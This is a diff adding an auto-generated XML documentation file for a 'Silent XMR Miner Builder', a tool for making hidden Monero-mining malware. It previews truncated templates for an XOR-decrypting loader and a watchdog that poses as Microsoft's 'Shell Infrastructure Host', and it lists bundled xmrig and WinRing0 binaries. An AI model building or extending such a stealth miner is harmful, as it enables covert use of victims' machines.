@@ -1,0 +1,192 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Silent XMR Miner Builder
+</name>
+</assembly>
+<members>
+<member name="T:SilentXMRMiner.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.administrator">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Compilers">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Includes">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.libs">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.microsoft_admin">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Monero">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.MoneroPNG">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Program">
+<summary>
+  Looks up a localized string similar to using System;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Management;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+#if DefAssembly
+[assembly: AssemblyTitle(&quot;%Title%&quot;)]
+[assembly: AssemblyDescription(&quot;%Description%&quot;)]
+[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+[assembly: AssemblyProduct(&quot;%Produ [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Program1">
+<summary>
+  Looks up a localized string similar to #include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;sys/types.h&gt;
+#include &quot;Includes/syscalls.h&quot;
+
+/* Created by Unam Sanctam, https://github.com/UnamSanctam */
+
+char* cipher(char* data, long dataLen) {
+	char* output = (char*)malloc(sizeof(char) * dataLen+1);
+	output[dataLen] = 0;
+	for (int i = 0; i &lt; dataLen; i++) {
+		output[i] = data[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
+	}
+	return output;
+}
+
+int main(int argc, char** argv) {
+	Sleep(#DELAY * 1000);
+
+	PROCESS_INFORMATION p_info;
+	STARTUPINFO s_info  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.resource">
+<summary>
+  Looks up a localized string similar to #ifdef DefIcon
+MAINICON ICON &quot;#ICON&quot;
+#endif
+#ifdef DefAdmin
+1 24 &quot;administrator.manifest&quot;
+#endif
+#ifdef DefAssembly
+1 VERSIONINFO
+FILEVERSION     #VERSION
+PRODUCTVERSION  #VERSION
+BEGIN
+    BLOCK &quot;StringFileInfo&quot;
+    BEGIN
+        BLOCK &quot;040904b0&quot;
+        BEGIN
+            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
+			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
+            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
+            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
+            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
+			VALUE &quot;LegalTrademark&quot;, &quot;#T [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Uninstaller">
+<summary>
+  Looks up a localized string similar to using System;
+using System.IO;
+using System.Reflection;
+using System.Security.Principal;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Resources;
+using System.Threading;
+using System.Diagnostics;
+using Microsoft.Win32;
+using System.Collections.Generic;
+using System.Management;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+public partial class RUninstaller
+{
+    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.App [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.Watchdog">
+<summary>
+  Looks up a localized string similar to using System;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Reflection;
+using System.Security.Principal;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
+[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
+[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
+[assembly: AssemblyCop [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.WinRing0x64">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SilentXMRMiner.My.Resources.Resources.xmrig">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+</members>
+</doc>
